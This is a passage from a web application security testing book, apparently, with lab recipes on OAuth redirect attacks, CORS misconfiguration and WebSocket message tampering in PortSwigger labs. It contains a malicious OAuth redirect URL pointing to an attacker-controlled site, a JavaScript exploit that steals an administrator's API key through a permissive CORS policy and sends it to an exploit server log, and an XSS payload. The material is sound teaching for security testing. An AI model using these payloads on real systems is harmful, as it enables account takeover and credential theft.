<p><span class="koboSpan" id="kobo.598.1">The OAuth 2.0 framework is a </span><a id="_idIndexMarker439"/><span class="koboSpan" id="kobo.599.1">very common tool used for authentication, yet it is </span><a id="_idIndexMarker440"/><span class="koboSpan" id="kobo.600.1">common for vulnerabilities to occur due to misconfigurations. </span><span class="koboSpan" id="kobo.600.2">One essential component of the OAuth flow is redirect URLs. </span><span class="koboSpan" id="kobo.600.3">The authorization server will direct the user back to the application once the user has successfully authorized a certain application. </span><span class="koboSpan" id="kobo.600.4">It is essential that the service does not reroute the customer to random places since the redirect URL includes </span><span class="No-Break"><span class="koboSpan" id="kobo.601.1">crucial information.</span></span></p>
<p><span class="koboSpan" id="kobo.602.1">OAuth providers are a prime target for phishing attacks since they fail to validate </span><strong class="source-inline"><span class="koboSpan" id="kobo.603.1">redirect_uri</span></strong><span class="koboSpan" id="kobo.604.1"> when delivering the </span><strong class="source-inline"><span class="koboSpan" id="kobo.605.1">access_token</span></strong><span class="koboSpan" id="kobo.606.1"> through the </span><span class="No-Break"><span class="koboSpan" id="kobo.607.1">browser redirect.</span></span></p>
<p><span class="koboSpan" id="kobo.608.1">In this attack, the threat actor provides the target with a URL to a trusted authentication portal, and by using this authentication portal, the malicious user can send the victim’s secret </span><strong class="source-inline"><span class="koboSpan" id="kobo.609.1">access_token</span></strong><span class="koboSpan" id="kobo.610.1"> to their controlled web server, which allows the attacker access to </span><span class="No-Break"><span class="koboSpan" id="kobo.611.1">unintended resources.</span></span></p>
<h2 id="_idParaDest-272"><a id="_idTextAnchor347"/><span class="koboSpan" id="kobo.612.1">There's more...</span></h2>
<p><span class="koboSpan" id="kobo.613.1">Users can offer access to their resources (i.e., data or an API) to a third-party application using the OAuth protocol without disclosing their login information. </span><span class="koboSpan" id="kobo.613.2">The following three key elements generally make up the OAuth </span><span class="No-Break"><span class="koboSpan" id="kobo.614.1">authentication process:</span></span></p>
<ul>
<li><strong class="bold"><span class="koboSpan" id="kobo.615.1">The client application</span></strong><span class="koboSpan" id="kobo.616.1">: This is a third-party program that seeks to gain access to the </span><a id="_idIndexMarker441"/><span class="koboSpan" id="kobo.617.1">user’s resources. </span><span class="koboSpan" id="kobo.617.2">It must be registered with the OAuth provider and be equipped with a client ID </span><span class="No-Break"><span class="koboSpan" id="kobo.618.1">and secret.</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.619.1">The authorization server</span></strong><span class="koboSpan" id="kobo.620.1">: This is the server responsible for managing the user’s </span><a id="_idIndexMarker442"/><span class="koboSpan" id="kobo.621.1">resources and authenticating the user. </span><span class="koboSpan" id="kobo.621.2">It is normally managed by the OAuth provider (such as Google, Facebook, Twitter, Linkedin, Windows Live, etc.) and is in charge of providing client </span><span class="No-Break"><span class="koboSpan" id="kobo.622.1">application access.</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.623.1">The resource owner</span></strong><span class="koboSpan" id="kobo.624.1">: This is the user who has access to the resources that the client </span><a id="_idIndexMarker443"/><span class="koboSpan" id="kobo.625.1">application wishes to use. </span><span class="koboSpan" id="kobo.625.2">The resource owner must provide the client application access to </span><span class="No-Break"><span class="koboSpan" id="kobo.626.1">their resources.</span></span></li>
</ul>
<p><span class="koboSpan" id="kobo.627.1">The client application redirects the user to the authorization server’s login page during the OAuth </span><a id="_idIndexMarker444"/><span class="koboSpan" id="kobo.628.1">authentication procedure. </span><span class="koboSpan" id="kobo.628.2">After that, the user inputs their login information and gives access to the client application. </span><span class="koboSpan" id="kobo.628.3">The authorization server then refers the user back to the client application, providing the client with an access token to access the </span><span class="No-Break"><span class="koboSpan" id="kobo.629.1">user’s resources.</span></span></p>
<p class="callout-heading"><span class="koboSpan" id="kobo.630.1">Important note</span></p>
<p class="callout"><span class="koboSpan" id="kobo.631.1">Additional components, such as the resource server, which stores the user’s resources, and the token endpoint, which gives the access token, may be included in some implementations </span><span class="No-Break"><span class="koboSpan" id="kobo.632.1">of OAuth.</span></span></p>
<p><span class="koboSpan" id="kobo.633.1">After a user grants access to a client application, an attacker can send them to a malicious website using an </span><em class="italic"><span class="koboSpan" id="kobo.634.1">OAuth redirection attack</span></em><span class="koboSpan" id="kobo.635.1"> (also called an </span><em class="italic"><span class="koboSpan" id="kobo.636.1">open redirection attack</span></em><span class="koboSpan" id="kobo.637.1">). </span><span class="koboSpan" id="kobo.637.2">This can be accomplished by fooling the user into clicking on a link containing a malicious redirect URI or changing the redirect URI that the client application uses. </span><span class="koboSpan" id="kobo.637.3">The attacker can take the access token and use it to access the user’s resources once the user has been forcibly redirected to the </span><span class="No-Break"><span class="koboSpan" id="kobo.638.1">malicious website.</span></span></p>
<p><span class="koboSpan" id="kobo.639.1">Here is a simplified example of an attacker’s URL string that could be used to execute this type </span><span class="No-Break"><span class="koboSpan" id="kobo.640.1">of attack:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.641.1">
https://legitimate-oauth-provider.com/authorize?redirect_uri=https://attacker-controlled-website.com/redirect</span></pre>
<p><span class="koboSpan" id="kobo.642.1">The redirect URI of </span><a id="_idIndexMarker445"/><span class="koboSpan" id="kobo.643.1">the client application, the authorization endpoint of the legal OAuth provider, and a </span><strong class="source-inline"><span class="koboSpan" id="kobo.644.1">query</span></strong><span class="koboSpan" id="kobo.645.1"> parameter pointing to the attacker’s website are all included in this example’s URL string. </span><span class="koboSpan" id="kobo.645.2">The attacker’s website will serve as the redirect URI when the victim clicks the link, which causes their browser to submit a request with this URL string to the authe</span><a id="_idTextAnchor348"/><span class="koboSpan" id="kobo.646.1">ntic OAuth </span><span class="No-Break"><span class="koboSpan" id="kobo.647.1">provider’s website.</span></span></p>
<h1 id="_idParaDest-273"><a id="_idTextAnchor349"/><span class="koboSpan" id="kobo.648.1">Testing cross-origin resource sharing</span></h1>
<p><span class="koboSpan" id="kobo.649.1">To understand </span><strong class="bold"><span class="koboSpan" id="kobo.650.1">cross-origin resource sharing</span></strong><span class="koboSpan" id="kobo.651.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.652.1">CORS</span></strong><span class="koboSpan" id="kobo.653.1">) vulnerability, first, you have to understand the same-origin policy. </span><span class="koboSpan" id="kobo.653.2">The same-origin policy was created to restrict the ability of </span><a id="_idIndexMarker446"/><span class="koboSpan" id="kobo.654.1">websites to access resources that are not from the source domain. </span><span class="koboSpan" id="kobo.654.2">Although for some websites the same-origin policy is a problem, many websites nowadays interact with subdomains or third-party websites that need cross-origin exceptions. </span><span class="koboSpan" id="kobo.654.3">CORS was created to resolve </span><span class="No-Break"><span class="koboSpan" id="kobo.655.1">this issue.</span></span></p>
<h2 id="_idParaDest-274"><a id="_idTextAnchor350"/><span class="koboSpan" id="kobo.656.1">Getting ready</span></h2>
<p><span class="koboSpan" id="kobo.657.1">This lab requires a PortSwigger Academy account and ZAP to intercept requests and responses from the server to your browser. </span><span class="koboSpan" id="kobo.657.2">The login credentials for the lab web application are </span><span class="No-Break"><span class="koboSpan" id="kobo.658.1">as follows:</span></span></p>
<ul>
<li><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.659.1">Username</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.660.1">: </span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.661.1">wiener</span></strong></span></li>
<li><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.662.1">Password</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.663.1">: </span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.664.1">peter</span></strong></span></li>
</ul>
<h2 id="_idParaDest-275"><a id="_idTextAnchor351"/><span class="koboSpan" id="kobo.665.1">How to do it...</span></h2>
<p><span class="koboSpan" id="kobo.666.1">In this recipe, the lab introduces a vulnerable website with an insecure CORS configuration to trust all origins. </span><span class="koboSpan" id="kobo.666.2">To solve this, we’ll form a malicious JavaScript function using CORS to retrieve an administrator’s API key and then upload the code to </span><span class="No-Break"><span class="koboSpan" id="kobo.667.1">the server.</span></span></p>
<p><span class="koboSpan" id="kobo.668.1">Take the </span><a id="_idIndexMarker447"/><span class="koboSpan" id="kobo.669.1">following steps to </span><span class="No-Break"><span class="koboSpan" id="kobo.670.1">get started:</span></span></p>
<ol>
<li value="1"><span class="koboSpan" id="kobo.671.1">Navigate to the URL with the browser proxied to ZAP and log into the PortSwigger Academy website to launch </span><span class="No-Break"><span class="koboSpan" id="kobo.672.1">the lab</span></span></li>
</ol>
<p><span class="koboSpan" id="kobo.673.1">(</span><a href="https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack"><span class="No-Break"><span class="koboSpan" id="kobo.674.1">https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack</span></span></a><span class="No-Break"><span class="koboSpan" id="kobo.675.1">).</span></span></p>
<ol>
<li value="2"><span class="koboSpan" id="kobo.676.1">Fire up ZAP and ensure you use either the manual explorer and launch the Firefox browser or have a browser extension tool enabled for proxying </span><span class="No-Break"><span class="koboSpan" id="kobo.677.1">the page.</span></span></li>
<li><span class="koboSpan" id="kobo.678.1">Once the lab loads and you reach the homepage of the application, click </span><strong class="bold"><span class="koboSpan" id="kobo.679.1">My Account</span></strong><span class="koboSpan" id="kobo.680.1">. </span><span class="koboSpan" id="kobo.680.2">Use the credentials provided to log in and access the </span><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.681.1">Account</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.682.1"> page.</span></span></li>
<li><span class="koboSpan" id="kobo.683.1">Review the history and look at the response header (see </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.684.1">Figure 9</span></em></span><em class="italic"><span class="koboSpan" id="kobo.685.1">.15</span></em><span class="koboSpan" id="kobo.686.1">), which will have your key that was retrieved by an AJAX request to </span><strong class="source-inline"><span class="koboSpan" id="kobo.687.1">/accountDetails</span></strong><span class="koboSpan" id="kobo.688.1">. </span><span class="koboSpan" id="kobo.688.2">Within the same response, you will see the </span><strong class="source-inline"><span class="koboSpan" id="kobo.689.1">Access-Control-Allow-Credentials</span></strong><span class="koboSpan" id="kobo.690.1"> header. </span><span class="koboSpan" id="kobo.690.2">This lets us know it may </span><span class="No-Break"><span class="koboSpan" id="kobo.691.1">be CORS:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer236">
<span class="koboSpan" id="kobo.692.1"><img alt="Figure 9.15 – The API key response header" src="image/Figure_9.15_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.693.1">Figure 9.15 – The API key response header</span></p>
<ol>
<li value="5"><span class="koboSpan" id="kobo.694.1">Next, right-click the request and open it in </span><strong class="bold"><span class="koboSpan" id="kobo.695.1">Manual Request Editor</span></strong><span class="koboSpan" id="kobo.696.1">. </span><span class="koboSpan" id="kobo.696.2">Then resubmit </span><a id="_idIndexMarker448"/><span class="koboSpan" id="kobo.697.1">the request with the added header (see </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.698.1">Figure 9</span></em></span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.699.1">.16</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.700.1">):</span></span><pre class="console"><span class="koboSpan" id="kobo.701.1">
origin: https://zaprules.com</span></pre></li>
</ol>
<p><span class="koboSpan" id="kobo.702.1">Here, we see the </span><strong class="source-inline"><span class="koboSpan" id="kobo.703.1">origin</span></strong><span class="koboSpan" id="kobo.704.1"> header where we inputted our domain reflected back </span><span class="No-Break"><span class="koboSpan" id="kobo.705.1">to us:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer237">
<span class="koboSpan" id="kobo.706.1"><img alt="Figure 9.16 – Added origin header" src="image/Figure_9.16_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.707.1">Figure 9.16 – Added origin header</span></p>
<ol>
<li value="6"><span class="koboSpan" id="kobo.708.1">You’ll see that the URL we entered as </span><strong class="source-inline"><span class="koboSpan" id="kobo.709.1">origin</span></strong><span class="koboSpan" id="kobo.710.1"> is reflected back in the </span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.711.1">Access-Control-Allow-Origin</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.712.1"> header:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer238">
<span class="koboSpan" id="kobo.713.1"><img alt="Figure 9.17 – The response header showing origin" src="image/Figure_9.17_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.714.1">Figure 9.17 – The response header showing origin</span></p>
<ol>
<li value="7"><span class="koboSpan" id="kobo.715.1">In the </span><a id="_idIndexMarker449"/><span class="koboSpan" id="kobo.716.1">lab at the top of the browser, click </span><strong class="bold"><span class="koboSpan" id="kobo.717.1">Go to exploit server</span></strong><span class="koboSpan" id="kobo.718.1"> and enter the following payload HTML script. </span><span class="koboSpan" id="kobo.718.2">Be sure to replace </span><strong class="source-inline"><span class="koboSpan" id="kobo.719.1">&lt;random-string&gt;</span></strong><span class="koboSpan" id="kobo.720.1"> with your unique lab URL that generates when you first start </span><span class="No-Break"><span class="koboSpan" id="kobo.721.1">the lab:</span></span><pre class="console"><span class="koboSpan" id="kobo.722.1">
&lt;script&gt;</span></pre><pre class="console"><span class="koboSpan" id="kobo.723.1">
var req = new XMLHttpRequest();</span></pre><pre class="console"><span class="koboSpan" id="kobo.724.1">
req.onload = reqListener;</span></pre><pre class="console"><span class="koboSpan" id="kobo.725.1">
req.open('get','https://&lt;random-string&gt;.web-security-academy.net/accountDetails',true);</span></pre><pre class="console"><span class="koboSpan" id="kobo.726.1">
req.withCredentials = true;</span></pre><pre class="console"><span class="koboSpan" id="kobo.727.1">
req.send();</span></pre><pre class="console"><span class="koboSpan" id="kobo.728.1">
function reqListener() {</span></pre><pre class="console"><span class="koboSpan" id="kobo.729.1">
location='/log?key='+this.responseText;</span></pre><pre class="console"><span class="koboSpan" id="kobo.730.1">
};</span></pre><pre class="console"><span class="koboSpan" id="kobo.731.1">
&lt;/script&gt;</span></pre></li>
</ol>
<p><span class="koboSpan" id="kobo.732.1">In </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.733.1">Figure 9</span></em></span><em class="italic"><span class="koboSpan" id="kobo.734.1">.18</span></em><span class="koboSpan" id="kobo.735.1">, we see the lab header, which shows the </span><strong class="bold"><span class="koboSpan" id="kobo.736.1">Go to exploit server</span></strong><span class="koboSpan" id="kobo.737.1"> button and the </span><strong class="bold"><span class="koboSpan" id="kobo.738.1">Submit solution</span></strong><span class="koboSpan" id="kobo.739.1"> button to solve </span><span class="No-Break"><span class="koboSpan" id="kobo.740.1">the lab:</span></span></p>
<div>
<div class="IMG---Figure" id="_idContainer239">
<span class="koboSpan" id="kobo.741.1"><img alt="Figure 9.18 – Link to the exploit server" src="image/Figure_9.18_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.742.1">Figure 9.18 – Link to the exploit server</span></p>
<ol>
<li value="8"><span class="koboSpan" id="kobo.743.1">Click </span><strong class="bold"><span class="koboSpan" id="kobo.744.1">View exploit</span></strong><span class="koboSpan" id="kobo.745.1"> at the bottom of the page. </span><span class="koboSpan" id="kobo.745.2">This will help ensure that the exploit </span><a id="_idIndexMarker450"/><span class="koboSpan" id="kobo.746.1">works and that you have landed on the log page with your API key in the URL, as shown in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.747.1">Figure 9</span></em></span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.748.1">.20</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.749.1">:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer240">
<span class="koboSpan" id="kobo.750.1"><img alt="Figure 9.19 – View exploit logs" src="image/Figure_9.19_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.751.1">Figure 9.19 – View exploit logs</span></p>
<ol>
<li value="9"><span class="koboSpan" id="kobo.752.1">Go back to the exploit server and first click </span><strong class="bold"><span class="koboSpan" id="kobo.753.1">Store</span></strong><span class="koboSpan" id="kobo.754.1">, then click </span><strong class="bold"><span class="koboSpan" id="kobo.755.1">Deliver exploit to victim</span></strong><span class="koboSpan" id="kobo.756.1"> to send </span><span class="No-Break"><span class="koboSpan" id="kobo.757.1">the exploit:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer241">
<span class="koboSpan" id="kobo.758.1"><img alt="Figure 9.20 – The Deliver exploit to victim button" src="image/Figure_9.20_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.759.1">Figure 9.20 – The Deliver exploit to victim button</span></p>
<ol>
<li value="10"><span class="koboSpan" id="kobo.760.1">After sending the exploit, click </span><strong class="bold"><span class="koboSpan" id="kobo.761.1">Access log</span></strong><span class="koboSpan" id="kobo.762.1"> to retrieve the administrator’s API key from the </span><strong class="source-inline"><span class="koboSpan" id="kobo.763.1">/log?key=</span></strong><span class="koboSpan" id="kobo.764.1"> log entry. </span><span class="koboSpan" id="kobo.764.2">For an easier way of searching, look at the IP address in the </span><span class="No-Break"><span class="koboSpan" id="kobo.765.1">left column:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer242">
<span class="koboSpan" id="kobo.766.1"><img alt="Figure 9.21 – The Admin’s API key" src="image/Figure_9.21_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.767.1">Figure 9.21 – The Admin’s API key</span></p>
<ol>
<li value="11"><span class="koboSpan" id="kobo.768.1">To complete, use the </span><strong class="bold"><span class="koboSpan" id="kobo.769.1">Submit solution</span></strong><span class="koboSpan" id="kobo.770.1"> button that’s at the top of the lab web page. </span><span class="koboSpan" id="kobo.770.2">It can be seen from either the main lab page or when osn the exploit </span><span class="No-Break"><span class="koboSpan" id="kobo.771.1">server page.</span></span></li>
</ol>
<h2 id="_idParaDest-276"><a id="_idTextAnchor352"/><span class="koboSpan" id="kobo.772.1">How it works...</span></h2>
<p><span class="koboSpan" id="kobo.773.1">CORS allows </span><a id="_idIndexMarker451"/><span class="koboSpan" id="kobo.774.1">websites to request resources from other websites by utilizing HTTP headers to set the allowed origins. </span><span class="koboSpan" id="kobo.774.2">The headers used by CORS are </span><strong class="source-inline"><span class="koboSpan" id="kobo.775.1">Access-Control-Allow-Origin</span></strong><span class="koboSpan" id="kobo.776.1"> and </span><strong class="source-inline"><span class="koboSpan" id="kobo.777.1">Access-Control-Allow-Credentials</span></strong><span class="koboSpan" id="kobo.778.1">. </span><strong class="source-inline"><span class="koboSpan" id="kobo.779.1">Access-Control-Allow-Origin</span></strong><span class="koboSpan" id="kobo.780.1"> has three values, which are: a wild card </span><strong class="source-inline"><span class="koboSpan" id="kobo.781.1">(*)</span></strong><span class="koboSpan" id="kobo.782.1"> that allows all origins, </span><strong class="source-inline"><span class="koboSpan" id="kobo.783.1">&lt;origin&gt;</span></strong><span class="koboSpan" id="kobo.784.1"> that specifies only one origin, and </span><strong class="source-inline"><span class="koboSpan" id="kobo.785.1">null</span></strong><span class="koboSpan" id="kobo.786.1">, which is used for multiple reasons, some of them are when the website is receiving cross-origin redirects or using </span><strong class="source-inline"><span class="koboSpan" id="kobo.787.1">file: protocol</span></strong><span class="koboSpan" id="kobo.788.1">. </span><span class="koboSpan" id="kobo.788.2">The </span><strong class="source-inline"><span class="koboSpan" id="kobo.789.1">Access-Control-Allow-Credentials</span></strong><span class="koboSpan" id="kobo.790.1"> header only takes a </span><strong class="source-inline"><span class="koboSpan" id="kobo.791.1">true</span></strong><span class="koboSpan" id="kobo.792.1"> value and is used to send </span><span class="No-Break"><span class="koboSpan" id="kobo.793.1">authentication information.</span></span></p>
<p><span class="koboSpan" id="kobo.794.1">This vulnerability arises as a result of misconfiguration. </span><span class="koboSpan" id="kobo.794.2">Misconfiguration could be but is not limited to, allowing all origins or accepting all origins ending in a specific string, such as </span><strong class="source-inline"><span class="koboSpan" id="kobo.795.1">zapproxy.com</span></strong><span class="koboSpan" id="kobo.796.1">. </span><span class="koboSpan" id="kobo.796.2">An attacker could register </span><strong class="source-inline"><span class="koboSpan" id="kobo.797.1">attackersitezapproxy.com</span></strong><span class="koboSpan" id="kobo.798.1">, and this origin will </span><span class="No-Break"><span class="koboSpan" id="kobo.799.1">be accepted.</span></span></p>
<p><span class="koboSpan" id="kobo.800.1">The impact of CORS vulnerabilities depends on which header is set and the information that the website provides. </span><span class="koboSpan" id="kobo.800.2">If the </span><strong class="source-inline"><span class="koboSpan" id="kobo.801.1">Access-Control-Allow-Credentials</span></strong><span class="koboSpan" id="kobo.802.1"> is set to </span><strong class="source-inline"><span class="koboSpan" id="kobo.803.1">true</span></strong><span class="koboSpan" id="kobo.804.1">, an attacker could extract authentication information from </span><span class="No-Break"><span class="koboSpan" id="kobo.805.1">the website.</span></span></p>
<h2 id="_idParaDest-277"><a id="_idTextAnchor353"/><span class="koboSpan" id="kobo.806.1">There's more...</span></h2>
<p><span class="koboSpan" id="kobo.807.1">CORS attacks can be used with other forms of attacks to exploit additional vulnerabilities in a targeted server. </span><span class="koboSpan" id="kobo.807.2">Here are some types of attacks that may be combined </span><span class="No-Break"><span class="koboSpan" id="kobo.808.1">with CORS:</span></span></p>
<ul>
<li><strong class="bold"><span class="koboSpan" id="kobo.809.1">XSS</span></strong><span class="koboSpan" id="kobo.810.1">: A CORS attack </span><a id="_idIndexMarker452"/><span class="koboSpan" id="kobo.811.1">can be used by an attacker to circumvent the same-origin policy and inject malicious code into a website, allowing them to steal sensitive information from </span><span class="No-Break"><span class="koboSpan" id="kobo.812.1">website visitors</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.813.1">CSRF</span></strong><span class="koboSpan" id="kobo.814.1">: An attacker </span><a id="_idIndexMarker453"/><span class="koboSpan" id="kobo.815.1">can employ a CORS attack to fool a server into believing that a request is coming from a trustworthy source, allowing them to undertake activities on behalf of a </span><span class="No-Break"><span class="koboSpan" id="kobo.816.1">genuine user</span></span></li>
<li><strong class="bold"><span class="koboSpan" id="kobo.817.1">Phishing</span></strong><span class="koboSpan" id="kobo.818.1">: An attacker </span><a id="_idIndexMarker454"/><span class="koboSpan" id="kobo.819.1">can use a CORS attack to generate a bogus login page on a malicious website and then use the CORS attack to access the user’s personal information after their credentials </span><span class="No-Break"><span class="koboSpan" id="kobo.820.1">are entered</span></span></li>
</ul>
<p><span class="koboSpan" id="kobo.821.1">An attacker often initiates these sorts of attacks by modifying the request headers to fool the server into thinking the request is coming from a trustworthy origin, generating phony login pages, or injecting malicious code. </span><span class="koboSpan" id="kobo.821.2">The attacker must also be able to steal the authentication tokens or obtain the sensi</span><a id="_idTextAnchor354"/><span class="koboSpan" id="kobo.822.1">tive data that is </span><span class="No-Break"><span class="koboSpan" id="kobo.823.1">being exposed.</span></span></p>
<h1 id="_idParaDest-278"><a id="_idTextAnchor355"/><span class="koboSpan" id="kobo.824.1">Testing WebSockets</span></h1>
<p><span class="koboSpan" id="kobo.825.1">WebSockets are an ongoing, two-way channel of communication between a client and backend service, such as </span><a id="_idIndexMarker455"/><span class="koboSpan" id="kobo.826.1">a database or an API service. </span><span class="koboSpan" id="kobo.826.2">WebSockets may transmit any number of protocols and offer server-to-client message delivery without polling (the process of one program or device repeatedly checking the status of other programs </span><span class="No-Break"><span class="koboSpan" id="kobo.827.1">or devices).</span></span></p>
<h2 id="_idParaDest-279"><a id="_idTextAnchor356"/><span class="koboSpan" id="kobo.828.1">Getting ready</span></h2>
<p><span class="koboSpan" id="kobo.829.1">This lab requires a PortSwigger Academy account and ZAP to intercept requests and responses from the server to </span><span class="No-Break"><span class="koboSpan" id="kobo.830.1">your browser.</span></span></p>
<p><span class="koboSpan" id="kobo.831.1">Before starting the lab, within ZAP, go to </span><strong class="bold"><span class="koboSpan" id="kobo.832.1">Tools</span></strong><span class="koboSpan" id="kobo.833.1">, </span><strong class="bold"><span class="koboSpan" id="kobo.834.1">Options</span></strong><span class="koboSpan" id="kobo.835.1">, and scroll down to the </span><strong class="bold"><span class="koboSpan" id="kobo.836.1">WebSockets</span></strong><span class="koboSpan" id="kobo.837.1"> section. </span><span class="koboSpan" id="kobo.837.2">Here you must enable </span><strong class="bold"><span class="koboSpan" id="kobo.838.1">Break on enabled ‘all request/response break buttons’</span></strong><span class="koboSpan" id="kobo.839.1">. </span><span class="koboSpan" id="kobo.839.2">Otherwise, you will not be able to capture the WebSocket request and manipulate it to complete </span><span class="No-Break"><span class="koboSpan" id="kobo.840.1">this lab.</span></span></p>
<h2 id="_idParaDest-280"><a id="_idTextAnchor357"/><span class="koboSpan" id="kobo.841.1">How to do it...</span></h2>
<p><span class="koboSpan" id="kobo.842.1">WebSockets are being used to implement the live chat feature in this </span><span class="No-Break"><span class="koboSpan" id="kobo.843.1">online store.</span></span></p>
<p><span class="koboSpan" id="kobo.844.1">In this recipe, a fictitious </span><a id="_idIndexMarker456"/><span class="koboSpan" id="kobo.845.1">support representative, aka a bot, will read the chat message requests you send. </span><span class="koboSpan" id="kobo.845.2">While interpreting the responses, we’ll us</span><a id="_idTextAnchor358"/><span class="koboSpan" id="kobo.846.1">e a WebSocket message to create an </span><strong class="source-inline"><span class="koboSpan" id="kobo.847.1">alert()</span></strong><span class="koboSpan" id="kobo.848.1"> popup on the support agent’s browser. </span><span class="koboSpan" id="kobo.848.2">If successful, it will automatically complete </span><span class="No-Break"><span class="koboSpan" id="kobo.849.1">the lab.</span></span></p>
<p><span class="koboSpan" id="kobo.850.1">Take the following steps to </span><span class="No-Break"><span class="koboSpan" id="kobo.851.1">get started:</span></span></p>
<ol>
<li value="1"><span class="koboSpan" id="kobo.852.1">Navigate to the URL with the browser proxied to ZAP and log into the PortSwigger Academy website to launch the </span><span class="No-Break"><span class="koboSpan" id="kobo.853.1">lab (</span></span><a href="https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities"><span class="No-Break"><span class="koboSpan" id="kobo.854.1">https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities</span></span></a><span class="No-Break"><span class="koboSpan" id="kobo.855.1">).</span></span></li>
<li><span class="koboSpan" id="kobo.856.1">Within ZAP, enter the scoped URL into the manual explorer and launch the browser to open up Firefox. </span><span class="koboSpan" id="kobo.856.2">Click </span><strong class="bold"><span class="koboSpan" id="kobo.857.1">Continue to </span></strong><span class="No-Break"><strong class="bold"><span class="koboSpan" id="kobo.858.1">your target</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.859.1">.</span></span></li>
<li><span class="koboSpan" id="kobo.860.1">In the upper right-hand corner of the web application, click </span><strong class="bold"><span class="koboSpan" id="kobo.861.1">Live chat</span></strong><span class="koboSpan" id="kobo.862.1"> and send a random </span><span class="No-Break"><span class="koboSpan" id="kobo.863.1">chat message.</span></span></li>
<li><span class="koboSpan" id="kobo.864.1">Go to the WebSockets </span><strong class="bold"><span class="koboSpan" id="kobo.865.1">History</span></strong><span class="koboSpan" id="kobo.866.1"> tab in ZAP, and look for the chat message that you previously sent in the original WebSocket message (see </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.867.1">Figure 9</span></em></span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.868.1">.22</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.869.1">):</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer243">
<span class="koboSpan" id="kobo.870.1"><img alt="Figure 9.22 – The WebSockets History tab" src="image/Figure_9.22_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.871.1">Figure 9.22 – The WebSockets History tab</span></p>
<ol>
<li value="5"><span class="koboSpan" id="kobo.872.1">Back within the application, send another new message, but this time containing a </span><span class="No-Break"><span class="koboSpan" id="kobo.873.1">less-than character:</span></span><pre class="console"><span class="koboSpan" id="kobo.874.1">
&lt;</span></pre></li>
<li><span class="koboSpan" id="kobo.875.1">Look back in the ZAP WebSocket history to find the corresponding WebSocket message and observe that the less-than symbol has been converted to HTML-encoded by the client before sending, as in </span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.876.1">Figure 9</span></em></span><span class="No-Break"><em class="italic"><span class="koboSpan" id="kobo.877.1">.23</span></em></span><span class="No-Break"><span class="koboSpan" id="kobo.878.1">:</span></span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer244">
<span class="koboSpan" id="kobo.879.1"><img alt="Figure 9.23 – HTML-encoded less-than character" src="image/Figure_9.23_B18829.jpg"/></span>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US"><span class="koboSpan" id="kobo.880.1">Figure 9.23 – HTML-encoded less-than character</span></p>
<ol>
<li value="7"><span class="koboSpan" id="kobo.881.1">Again, send another </span><a id="_idIndexMarker457"/><span class="koboSpan" id="kobo.882.1">chat message, but this time set a breakpoint, and while your message is in transit, manipulate the request to contain the </span><span class="No-Break"><span class="koboSpan" id="kobo.883.1">following payload:</span></span><pre class="console"><span class="koboSpan" id="kobo.884.1">
&lt;img src=1 onerror='alert(1)'&gt;</span></pre></li>
</ol>
<p class="callout-heading"><span class="koboSpan" id="kobo.885.1">Important note</span></p>
